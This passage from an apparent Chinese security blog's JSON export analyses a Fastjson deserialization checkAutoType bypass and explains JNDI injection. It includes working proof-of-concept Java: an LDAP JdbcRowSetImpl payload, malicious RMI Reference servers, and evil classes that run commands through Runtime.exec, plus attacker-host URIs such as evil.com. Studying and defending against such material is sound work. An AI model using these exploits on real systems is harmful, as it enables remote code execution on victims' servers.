\"\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"autoCommit\\\":true&#125;&#125;\"; JSON.parse(payload); &#125;&#125; 本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。 绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。 回顾一下审计的过程： 我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) checkAutoType方法拿到Class.class 设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向 进入deserializer.deserialze com.alibaba.fastjson.serializer.MiscCodec#deserialze parser.resolveStatus为TypeNameRedirect，进入if为true走向 解析”val”:”恶意类名”，放入objVal，再传递到strVal 因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader) 添加默认cache为true，调用loadClass com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean) 三个改变mappings的第一处，由于classLoader=null，不进入 三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。 关于AutoTypeSupport可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。 但是如果目标服务端开启了AutoTypeSupport呢？经测试发现： 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发； 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用； 调试分析受AutoTypeSupport影响的版本受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。 开启AutoTypeSupport时1ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 发现报错： 调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。 在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持： 未开启AutoTypeSupport时当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。 这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码： 对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过&amp;&amp;多添加了一个判断条件TypeUtils.getClassFromMapping(typeName) == null，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过： 12345// 受AutoTypeSupport影响的版本if (className.startsWith(deny)) &#123;// 不受AutoTypeSupport影响的版本if (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; 不受AutoTypeSupport影响的版本不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。 未开启AutoTypeSupport时在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。 在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回： 往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量： 接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类： 在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中： 在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测： 开启AutoTypeSupport由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。 在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类： 关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？ 我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的： 1if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; 第一个判断条件Arrays.binarySearch(denyHashCodes, hash) &gt;= 0是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件TypeUtils.getClassFromMapping(typeName) == null，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。 1.2.48 修复1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。 运行会报错： 1Exception in thread \"main\" com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl 调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。 对比代码。修改了cache这一处。（右侧为1.2.47代码） 本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。 现在这边直接指定过来三个参数loadClass同时cache为false。 对于之前提到了第三处mapping不需要校验，1.2.48也不行了： 因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉： 1.2.48之后在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。 参考： mi1k7ea lalajun","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://0range228.github.io/tags/Fastjson/"}]},{"title":"搞懂JNDI","slug":"搞懂JNDI","date":"2020-06-28T03:05:22.000Z","updated":"2021-07-29T15:12:46.941Z","comments":true,"path":"搞懂JNDI/","link":"","permalink":"https://0range228.github.io/%E6%90%9E%E6%87%82JNDI/","excerpt":"序言 莫听穿林打叶声，何妨吟啸且徐行。 前几天在搞RMI，发现攻击方式经常结合JNDI注入一起玩，这篇直接先来总结JNDI","text":"序言 莫听穿林打叶声，何妨吟啸且徐行。 前几天在搞RMI，发现攻击方式经常结合JNDI注入一起玩，这篇直接先来总结JNDI 基本概念JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。 JNDI是Java API，允许客户端通过名称发现和查找数据、对象。 这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。 每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。 也就是说，JNDI就是一个简单的Java API，如InitialContext.Lookup（String Name），它只接受一个字符串参数； 如果该参数来自不可信的源的话，则可能因为远程类加载而引发远程代码执行攻击。 当被请求对象的名称处于攻击者掌控之下时，他们就能将受害Java应用程序指向恶意的RMI/LDAP/CORBA服务器，并使用任意对象进行响应。如果该对象是javax.naming.Reference类的实例，那么，JNDI客户端将尝试解析该对象的classFactory和classFactoryLocation属性。如果目标Java应用程序不知道ClassFactory的值，Java将使用Java的URLClassLoader从ClassFactoryLocation处获取该Factory的字节码。 由于其简单性，即使InitialContext.lookup方法没有直接暴露给受污染的数据，它对于利用Java漏洞来说也非常有用。在某些情况下，仍然可以通过反序列化或不安全的反射攻击来访问它。 如图： Java Naming Service命名服务是将名称与值相关联的实体，称为”绑定”。它提供了一种使用”find”或”search”操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。RMI Registry就是使用的Naming Service。 Java Directory Service目录服务是一种特殊的Naming Service，它允许存储和搜索”目录对象”，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是一种目录服务。 这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。 JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。 ObjectFactoryObject Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。 JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。 简单理解JNDIJNDI在客户端和服务器端都能够进行一些工作： 客户端上主要是进行各种访问，查询，搜索，服务器端主要进行的是帮助管理配置，也就是各种bind。 比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的JNDI动态协议转换。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。 JNDI代码示例在JNDI中提供了绑定和查找的方法： bind：将名称与一个对象绑定，这里底层也是调用的rmi的registry去绑定 lookup：通过名字检索对象； 这两个操作都是用的InitialContext类对象来调用。多说无益，直接上代码： 下面是基本用法Demo，以RMI服务为例。 先定义一个Person类： 12345678910111213141516171819202122232425public class Person implements Remote, Serializable &#123; private static final long serialVersionUID = 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String toString()&#123; return \"name:\"+name+\" password:\"+password; &#125;&#125; 接下来是Server端，其实是将服务端和客户端的代码写在一起了，分为两个部分。 第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中； 第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索Person对象并输出出来： 12345678910111213141516171819202122232425262728293031323334353637public class Server &#123; public static void initPerson() throws Exception&#123; //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); //初始化 InitialContext ctx = new InitialContext(); //实例化person对象 Person p = new Person(); p.setName(\"mi1k7ea\"); p.setPassword(\"Niubility!\"); //person对象绑定到JNDI服务中，JNDI的名字叫做：person。 ctx.bind(\"person\", p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用再绑定了 InitialContext ctx = new InitialContext(); //通过lookup查找person对象 Person person = (Person) ctx.lookup(\"person\"); //打印出这个对象 System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; 运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来： 纯RMI与JNDI的对比我们可以简单比较一下纯RMI写法和使用JNDI检索的写法，在纯RMI写法中的两种典型写法： 123456789101112131415161718192021222324252627282930import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import remote.IRemoteMath;... //服务端 IRemoteMath remoteMath = new RemoteMath(); LocateRegistry.createRegistry(1099); Registry registry = LocateRegistry.getRegistry(); registry.bind(\"Compute\", remoteMath);... //客户端 Registry registry = LocateRegistry.getRegistry(\"localhost\"); IRemoteMath remoteMath = (IRemoteMath)registry.lookup(\"Compute\");或者import java.rmi.Naming;import java.rmi.registry.LocateRegistry;... //服务端 PersonService personService=new PersonServiceImpl(); LocateRegistry.createRegistry(6600); Naming.rebind(\"rmi://127.0.0.1:6600/PersonService\", personService);... //客户端 PersonService personService=(PersonService) Naming.lookup(\"rmi://127.0.0.1:6600/PersonService\"); 而JNDI中相关代码： 1234567891011121314151617181920212223242526272829import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;... //服务端 LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); InitialContext ctx = new InitialContext(); ... ctx.bind(\"person\", p); ctx.close();... //客户端 InitialContext ctx = new InitialContext(); Person person = (Person) ctx.lookup(\"person\"); ctx.close();或 //服务端 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env); 相比之下： 服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中； 客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的； 简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用Java Naming来实现的。 Reference类Reference类表示对存在于命名/目录系统以外的对象的引用。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。 几个比较关键的属性： className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议； 例如这里定义一个 Reference 实例，并使用继承了 UnicastRemoteObject 类的 ReferenceWrapper 包裹一下实例对象，使其能够通过 RMI 进行远程访问： 123Reference refObj = new Reference(\"refClassName\", \"insClassName\", \"http://example.com:12345/\");ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);registry.bind(\"refObj\", refObjWrapper); 当有客户端通过 lookup(&quot;refObj&quot;) 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 refClassName 的类，如果本地未找到，则会去请求 http://example.com:12345/refClassName.class 动态加载 classes 并调用 insClassName 的构造函数。 远程代码和安全管理器Java中的安全管理器Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。 JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。 JNDI的安全管理器对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制： 针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。 JNDI协议动态转换举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法： 12345678910111213 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env);或 LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); InitialContext ctx = new InitialContext(); 但在调用lookup()或者search()时，可以使用带URI动态的转换上下文环境，例如上面已经设置了当前上下文会访问RMI服务，那么可以直接使用LDAP的URI格式去转换上下文环境访问LDAP服务上的绑定对象而非原本的RMI服务： 1ctx.lookup(\"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com\"); 其原理可以跟踪代码找到： 123public Object lookup(String name) throws NamingException &#123; return getURLOrDefaultInitCtx(name).lookup(name);&#125; 再跟进去就知道了： 1234567891011121314151617protected Context getURLOrDefaultInitCtx(Name paramName) throws NamingException &#123; if (NamingManager.hasInitialContextFactoryBuilder()) &#123; return getDefaultInitCtx(); &#125; if (paramName.size() &gt; 0) &#123; String str1 = paramName.get(0); String str2 = getURLScheme(str1); // 尝试解析 URI 中的协议 if (str2 != null) &#123; // 如果存在 Schema 协议，则尝试获取其对应的上下文环境 Context localContext = NamingManager.getURLContext(str2, this.myProps); if (localContext != null) &#123; return localContext; &#125; &#125; &#125; return getDefaultInitCtx();&#125; JNDI注入前提防御&amp;JDK防御要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。 这里将所有不同版本JDK的防御都列出来： JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。 RMI攻击向量RMI+Reference利用技巧JNDI提供了一个Reference类来表示某个对象的引用，这个类中包含被引用对象的类信息和地址。 因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。 那么这个JNDI利用技巧是啥呢？——就是将恶意的Reference类绑定在RMI注册表中，其中恶意Reference引用指向远程恶意的class文件。当用户在/JNDI客户端的lookup()函数参数外部可控/或/Reference类构造方法的classFactoryLocation参数外部可控/时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行。 我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图： 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 rmi://evil.com:1099/refObj； 原先配置好的上下文环境 rmi://localhost:1099 会因为动态环境转换而被指向 rmi://evil.com:1099/； 应用去 rmi://evil.com:1099 请求绑定对象 refObj，攻击者事先准备好的 RMI 服务会返回与名称 refObj想绑定的 ReferenceWrapper 对象（Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)）； 应用获取到 ReferenceWrapper 对象开始从本地 CLASSPATH 中搜索 EvilObject 类，如果不存在则会从 http://evil-cb.com/ 上去尝试获取 EvilObject.class，即动态的去获取 http://evil-cb.com/EvilObject.class； 攻击者事先准备好的服务返回编译好的包含恶意代码的 EvilObject.class； 应用开始调用 EvilObject 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行； 代码如下，当然需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。 JNDIClient.java，lookup()函数参数外部可控： 123456789101112public class JNDIClient &#123; public static void main(String[] args) throws Exception &#123; if(args.length &lt; 1) &#123; System.out.println(\"Usage: java JNDIClient &lt;uri&gt;\"); System.exit(-1); &#125; String uri = args[0]; Context ctx = new InitialContext(); System.out.println(\"Using lookup() to fetch object with \" + uri); ctx.lookup(uri); &#125;&#125; EvilObject.java，恶意类，目的是弹计算器： 123456public class EvilObject &#123; public EvilObject() throws Exception &#123; Process pc = Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); pc.waitFor(); &#125;&#125; RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口： 123456789public class RMIService &#123; public static void main(String args[]) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); Reference refObj = new Reference(\"EvilObject\", \"EvilObject\", \"http://127.0.0.1:8080/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'\"); registry.bind(\"refObj\", refObjWrapper); &#125;&#125; 这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java（恶意类开头千万不要有package的字段！！！）放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入： 这里我再总结一下攻击的整体逻辑： JNDIClient：他就是个客户端，但是外部参数可控lookup（）位置； EvilObject.class：恶意类，内部的构造函数弹出计算器； RMIService：做了很多事 注册1099端口，registry对象； Reference类对象refObj：声明EvilObject恶意类，并写出他的位置，例如本地8080端口； 将上一步的refObj打包成ReferenceWrapper对象，叫做xxxWrapper； 最后一步直接绑定，将registry.bind(‘refObj’,xxxWrapper); 漏洞点1：lookup()参数注入当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，恶意类构造函数中有RCE，从而实现远程代码执行。 下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。 AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控： 1234567891011121314151617public class AClient &#123; public static void main(String[] args) throws Exception &#123; Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:1099\"); Context ctx = new InitialContext(env); String uri = \"\"; if(args.length == 1) &#123; uri = args[0]; System.out.println(\"[*]Using lookup() to fetch object with \" + uri); ctx.lookup(uri); &#125; else &#123; System.out.println(\"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo\"); ctx.lookup(\"demo\"); &#125; &#125;&#125; AServer.java，是攻击者搭建的恶意RMI注册表服务而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）： 12345678910public class AServer &#123; public static void main(String args[]) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1688); //这里面test的位置是恶意类的位置，比如本地的话就是http://localhost:8080 Reference refObj = new Reference(\"EvilClass\", \"EvilClassFactory\", \"http://127.0.0.1:8080/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'\"); registry.bind(\"exp\", refObjWrapper); &#125;&#125; 最后编写恶意EvilClassFactory类，目标是在客户端执行ifconfig命令，将其编译成class文件后与AServer放置于同一目录下： 12345678910111213141516171819202122public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory &#123; public EvilClassFactory() throws RemoteException &#123; super(); InputStream inputStream; try &#123; inputStream = Runtime.getRuntime().exec(\"ifconfig\").getInputStream(); BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream)); String linestr; while ((linestr = bufferedReader.readLine()) != null)&#123; System.out.println(linestr); &#125; &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123; return null; &#125;&#125; 模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图： 最后小结一下，调用InitialContext.lookup()函数都有哪些类。 在RMI中调用了InitialContext.lookup()的类有： 1234org.springframework.transaction.jta.JtaTransactionManager.readObject()com.sun.rowset.JdbcRowSetImpl.execute()javax.management.remote.rmi.RMIConnector.connect()org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName) 在LDAP中调用了InitialContext.lookup()的类有： 123InitialDirContext.lookup()Spring's LdapTemplate.lookup()LdapTemplate.lookupContext() 漏洞点2-classFactoryLocation参数注入前面lookup()参数注入是基于RMI客户端的（服务端有毒，去污染客户端），也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。 整个利用原理过程如图： BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控： 12345678910public class BClient &#123; public static void main(String[] args) throws Exception &#123; Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:1099\"); Context ctx = new InitialContext(env); System.out.println(\"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo\"); ctx.lookup(\"demo\"); &#125;&#125; BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控： 12345678910111213141516public class BServer &#123; public static void main(String args[]) throws Exception &#123; String uri = \"\"; if(args.length == 1) &#123; uri = args[0]; &#125; else &#123; uri = \"http://127.0.0.1/demo.class\"; &#125; System.out.println(\"[*]classFactoryLocation: \" + uri); Registry registry = LocateRegistry.createRegistry(1099); Reference refObj = new Reference(\"EvilClass\", \"EvilClassFactory\", uri); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"[*]Binding 'demo' to 'rmi://127.0.0.1:1099/demo'\"); registry.bind(\"demo\", refObjWrapper); &#125;&#125; EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行uname -a命令并输出出来： 12345678910111213141516171819202122public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory &#123; public EvilClassFactory() throws RemoteException &#123; super(); InputStream inputStream; try &#123; inputStream = Runtime.getRuntime().exec(\"uname -a\").getInputStream(); BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream)); String linestr; while ((linestr = bufferedReader.readLine()) != null)&#123; System.out.println(linestr); &#125; &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123; return null; &#125;&#125; 攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行： 漏洞点3-RMI恶意远程对象攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下： RMI客户端的上下文环境允许访问远程Codebase。 属性 java.rmi.server.useCodebaseOnly 的值必需为false。 然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 